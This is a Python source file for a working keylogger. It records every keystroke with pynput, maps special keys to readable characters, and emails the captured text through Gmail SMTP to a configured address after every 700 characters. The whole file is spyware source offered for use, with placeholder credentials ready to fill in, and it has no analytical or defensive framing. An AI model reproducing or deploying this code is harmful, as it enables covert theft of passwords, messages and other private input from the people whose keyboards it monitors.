from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Global variable to store typed characters
captured_keys = ""

def handle_key_press(key_event):
    """
    Converts and stores pressed keys into a global string,
    sending them via email after a specified length.
    """
    global captured_keys

    # Convert key event to string and remove quotes
    key_str = str(key_event).replace("'", "")

    # Replace special keys with readable characters
    special_keys = {
        'Key.space': ' ',
        'Key.enter': '\n',
        'Key.shift': '',
        'Key.backspace': '<'
    }

    key_str = special_keys.get(key_str, key_str)

    # Append processed key to the global log
    captured_keys += key_str

    # Trigger email sending after every 700 characters
    if len(captured_keys) >= 700:
        transmit_logs_via_email(captured_keys)
        captured_keys = ""  # Reset log after sending

def transmit_logs_via_email(log_data):
    """
    Sends the captured keystrokes to an email address.
    """
    sender_email = "YourGmail@gmail.com"
    recipient_email = "YourGmail@gmail.com"
    email_password = "your_app_password_here"  # Use app password from https://myaccount.google.com/apppasswords

    # Create MIME message
    email_msg = MIMEMultipart()
    email_msg['From'] = sender_email
    email_msg['To'] = recipient_email
    email_msg['Subject'] = "Captured Keystrokes Log"
    email_msg.attach(MIMEText(log_data, 'plain'))

    # Connect and send email using Gmail SMTP
    try:
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
        smtp_server.starttls()
        smtp_server.login(sender_email, email_password)
        smtp_server.sendmail(sender_email, recipient_email, email_msg.as_string())
        smtp_server.quit()
    except Exception as e:
        print(f"[!] Error sending email: {e}")

# Start the keylogger listener
if __name__ == "__main__":
    with Listener(on_press=handle_key_press) as listener:
        listener.join()
